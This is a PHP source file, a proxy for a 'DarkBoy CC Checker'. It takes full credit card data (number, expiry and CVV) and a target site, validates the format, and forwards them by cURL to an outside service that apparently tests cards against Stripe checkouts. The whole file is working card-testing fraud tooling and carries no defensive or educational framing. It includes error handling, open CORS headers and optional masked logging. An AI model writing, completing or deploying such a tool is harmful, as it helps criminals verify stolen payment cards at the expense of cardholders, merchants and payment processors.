<?php
// PHP Proxy for DarkBoy CC Checker
// This file handles API calls to darkboy.onrender.com securely

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header("Content-Type: application/json");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit(0);
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Get input data
$input = json_decode(file_get_contents('php://input'), true);

if (!$input || !isset($input['cc']) || !isset($input['site'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing required parameters: cc and site']);
    exit;
}

$cc = $input['cc'];
$site = $input['site'];

// Validate credit card format
if (!preg_match('/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/', $cc)) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid credit card format. Use: NUMBER|MM|YYYY|CVV']);
    exit;
}

// Build API URL - using URL encoding for the CC parameter
$apiUrl = "https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=" . urlencode($site) . "/cc=" . urlencode($cc);

// Set up cURL with comprehensive error handling
$ch = curl_init();

curl_setopt_array($ch, [
    CURLOPT_URL => $apiUrl,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_TIMEOUT => 60,
    CURLOPT_CONNECTTIMEOUT => 30,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_SSL_VERIFYHOST => 2,
    CURLOPT_USERAGENT => 'DarkBoy-CC-Checker/2.0 (PHP Proxy)',
    CURLOPT_HTTPHEADER => [
        'Accept: application/json',
        'Cache-Control: no-cache',
        'Connection: keep-alive'
    ],
    // Add retry logic for failed connections
    CURLOPT_MAXREDIRS => 3,
    // Enable verbose logging for debugging (disable in production)
    // CURLOPT_VERBOSE => true
]);

// Execute the request
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
$curlErrno = curl_errno($ch);

curl_close($ch);

// Handle cURL errors
if ($curlErrno !== 0) {
    $errorMessages = [
        CURLE_OPERATION_TIMEOUTED => 'Request timeout - API server took too long to respond',
        CURLE_COULDNT_CONNECT => 'Connection failed - Unable to connect to API server',
        CURLE_COULDNT_RESOLVE_HOST => 'DNS resolution failed - Cannot resolve API hostname',
        CURLE_SSL_CONNECT_ERROR => 'SSL connection error - Certificate verification failed',
        CURLE_HTTP_NOT_FOUND => 'API endpoint not found',
        CURLE_GOT_NOTHING => 'No response received from API server'
    ];
    
    $errorMessage = isset($errorMessages[$curlErrno]) ? 
                   $errorMessages[$curlErrno] : 
                   "cURL Error #{$curlErrno}: {$curlError}";
    
    http_response_code(502);
    echo json_encode([
        'error' => $errorMessage,
        'curl_errno' => $curlErrno,
        'curl_error' => $curlError
    ]);
    exit;
}

// Handle HTTP errors
if ($httpCode >= 400) {
    $httpErrorMessages = [
        400 => 'Bad Request - Invalid parameters sent to API',
        401 => 'Unauthorized - API key may be invalid',
        403 => 'Forbidden - Access denied to API endpoint',
        404 => 'Not Found - API endpoint does not exist',
        429 => 'Rate Limited - Too many requests, please slow down',
        500 => 'Internal Server Error - API server error',
        502 => 'Bad Gateway - API server is down or unreachable',
        503 => 'Service Unavailable - API server is temporarily unavailable',
        504 => 'Gateway Timeout - API server did not respond in time'
    ];
    
    $errorMessage = isset($httpErrorMessages[$httpCode]) ? 
                   $httpErrorMessages[$httpCode] : 
                   "HTTP Error {$httpCode}";
    
    http_response_code($httpCode);
    echo json_encode([
        'error' => $errorMessage,
        'http_code' => $httpCode,
        'raw_response' => $response
    ]);
    exit;
}

// Validate response is not empty
if (empty($response)) {
    http_response_code(502);
    echo json_encode(['error' => 'Empty response received from API server']);
    exit;
}

// Try to decode JSON response
$jsonResponse = json_decode($response, true);

// If JSON decoding fails, return raw response with success status
if (json_last_error() !== JSON_ERROR_NONE) {
    // Sometimes the API returns plain text, so we'll wrap it
    $jsonResponse = [
        'status' => 'unknown',
        'message' => trim($response),
        'raw_response' => $response,
        'json_error' => json_last_error_msg()
    ];
}

// Add metadata to response
$jsonResponse['processed_at'] = date('Y-m-d H:i:s');
$jsonResponse['processing_time'] = microtime(true) - $_SERVER['REQUEST_TIME_FLOAT'];
$jsonResponse['api_url'] = $apiUrl; // For debugging (remove in production)

// Set appropriate HTTP status code based on response
http_response_code($httpCode);

// Return the processed response
echo json_encode($jsonResponse, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);

// Log successful requests for monitoring (optional)
if ($httpCode === 200 && isset($jsonResponse['status'])) {
    $logEntry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'cc_masked' => substr($cc, 0, 4) . '****' . substr($cc, -4),
        'site' => $site,
        'status' => $jsonResponse['status'] ?? 'unknown',
        'http_code' => $httpCode
    ];
    
    // Uncomment below to enable logging
    // error_log("CC_CHECKER: " . json_encode($logEntry), 3, 'cc_checker.log');
}
?>